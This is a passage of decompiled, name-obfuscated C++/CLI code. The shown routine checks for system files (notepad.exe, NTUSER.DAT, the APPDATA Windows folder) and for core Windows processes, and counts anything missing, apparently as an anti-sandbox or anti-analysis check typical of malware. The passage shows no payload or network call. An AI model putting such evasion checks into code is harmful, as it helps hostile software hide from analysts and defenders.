            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar7, \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_06KIMFAMMH\u0040WINDIR\u003F\u0024AA\u0040));
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = \u003CModule\u003E.std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, stdAllocatorCharPtr2, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BG\u0040NGOGJOPH\u0040\u003F2system32\u003F2notepad\u003F4exe\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u003D(&stdAllocatorChar3, stdAllocatorCharPtr3);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar7);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar7);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar9, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar3));
            bool flag2;
            // ISSUE: fault handler
            try
            {
              uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar9));
              flag2 = fileAttributesA == uint.MaxValue || ((int) fileAttributesA & 16) != 0;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar9);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar9);
            if (flag2)
              ++num2;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar10;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr4 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar10, \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040));
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar11;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr5 = \u003CModule\u003E.std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar11, stdAllocatorCharPtr4, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BE\u0040FELPKEBH\u0040\u003F2Microsoft\u003F2Windows\u003F2\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u003D(&stdAllocatorChar3, stdAllocatorCharPtr5);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar12;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar12, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar3));
            bool flag3;
            // ISSUE: fault handler
            try
            {
              uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar12));
              flag3 = fileAttributesA == uint.MaxValue || ((int) fileAttributesA & 16) == 0;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar12);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar12);
            if (flag3)
              ++num2;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar13;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr6 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar13, \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040DPNKMMOG\u0040USERPROFILE\u003F\u0024AA\u0040));
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar14;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr7 = \u003CModule\u003E.std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar14, stdAllocatorCharPtr6, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040PIILBIFA\u0040\u003F2NTUSER\u003F4DAT\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u003D(&stdAllocatorChar3, stdAllocatorCharPtr7);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar14);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar14);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar13);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar13);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar15;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar15, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar3));
            bool flag4;
            // ISSUE: fault handler
            try
            {
              uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar15));
              flag4 = fileAttributesA == uint.MaxValue || ((int) fileAttributesA & 16) != 0;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar15);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar15);
            if (flag4)
              ++num2;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT4, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BE\u0040OMGDNGEO\u0040\u003F\u0024AAc\u003F\u0024AAs\u003F\u0024AAr\u003F\u0024AAs\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag5;
            // ISSUE: fault handler
            try
            {
              flag5 = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT4);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT4);
            if (flag5)
              ++num2;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT5;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT5, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BI\u0040GOFOEOMC\u0040\u003F\u0024AAs\u003F\u0024AAv\u003F\u0024AAc\u003F\u0024AAh\u003F\u0024AAo\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag6;
            // ISSUE: fault handler
            try
            {
              flag6 = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT5);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT5);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT5);
            if (flag6)
              ++num2;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT6;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT6, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BK\u0040BPIGMGKF\u0040\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAp\u003F\u0024AAl\u003F\u0024AAo\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag7;
            // ISSUE: fault handler
            try
            {
              flag7 = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT6);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT6);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT6);
            if (flag7)
              ++num2;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT7;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT7, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BK\u0040ILFKGFOJ\u0040\u003F\u0024AAs\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AAv\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AAe\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag8;
            // ISSUE: fault handler
            try
            {
              flag8 = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT7);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT7);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT7);
            if (flag8)
              ++num2;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT8;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT8, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1O\u0040GINMMDNN\u0040\u003F\u0024AAS\u003F\u0024AAy\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAm\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag9;
            // ISSUE: fault handler
            try
            {
              flag9 = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT8);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT8);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT8);
            if (flag9)
              ++num2;
            if (num2 <= 0)
              goto label_105;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return true;
label_105:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return false;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool GmbzzHkEbofalLU()
  {
    allocator\u003Cwchar_t\u003E allocatorWcharT1;
    allocator\u003Cwchar_t\u003E* allocatorWcharTPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT1);
    allocator\u003Cwchar_t\u003E allocatorWcharT2;
